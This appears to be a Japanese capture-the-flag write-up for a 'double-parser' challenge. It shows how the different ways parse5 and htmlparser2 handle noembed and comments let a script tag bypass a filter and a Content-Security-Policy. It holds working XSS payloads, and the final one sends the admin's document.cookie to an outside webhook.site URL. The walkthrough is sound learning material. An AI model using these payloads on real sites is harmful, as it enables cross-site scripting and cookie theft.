# double-parser
ユーザーの入力がHTMLのパーサーライブラリである `parser5` でパースされ、その結果をさらに `htmlparser2` でパースする。また、それぞれのパース処理の直後にパース結果に `script` タグなどの禁止タグが含まれているかどうかがチェックされ、含まれている場合にはエラーとなり、レスポンスとして描画されない。

まず、 `parse5` と `htmlparser2` の挙動の違いとして、 `noembed` などのRaw text Elementsを認識するかの違いがある。これを利用して、`htmlparser2` において、次のように本来はコメントにならない部分をコメント部分として認識させ、禁止タグのチェックをバイパスすることができる。

```
<noembed><!--<a href="</noembed><noembed><script src=x onerror=alert(1)><noembed>">
```

さらに、 `htmlparser2` においては属性値中の `<>` がHTMLエンティティに変換されることを利用して、 `parse5` では有効な終端タグであるが、 `htmlparser2` で変換されてしまうようなタグを埋め込む。これにより、 `parse5` においては `noembed` で囲まれていなかったために有効なコメントとして認識されていたが、この変換によってコメントでは無くなるような部分を作る。

これら2つの挙動を組み合わせて下記のようなタグを作成することで、 `script` タグ部分がレスポンスに返却される。

```
<noembed><a href="</noembed>"><!-- <script><noembed><!--</noembed><script src=/?html=alert()></script> -->
```

また、 `Content-Security-Policy` の制約によって、自身のオリジンからのリソースからスクリプトを読み込む必要がある。

今度は同じエンドポイントを利用して、JavaScriptとして有効なスクリプトとなるレスポンスを得ることを考える。JavaScriptは先頭部分が `<!--` から始まる部分がコメントとして解釈されることを利用して、パラメータに次のような値を指定する。
```
<!----><p>
alert()
<!----></p>
```

下記のようなレスポンスが返ってくることから、JavaScriptとしてパース可能なスクリプトとなることが分かる。
```
<!----><html><head></head><body><p>
alert()
<!----></p></body></html>
```

よって次のようなHTMLを指定したURLを管理者に送信することでフラグを取得できる。

```
<noembed><a href="</noembed>"><!-- <script><noembed><!--</noembed><script src=/?html=%3c!----%3e%3cp%3e%0d%0alocation.href%3d%60https%3a%2f%2fwebhook.site%2fe4adfd3b-8a9c-439f-b930-dd229a6d43a8%3fx%3d%60%2bdocument.cookie%0d%0a%3c!----%3e%3c%2fp%3e></script> -->
```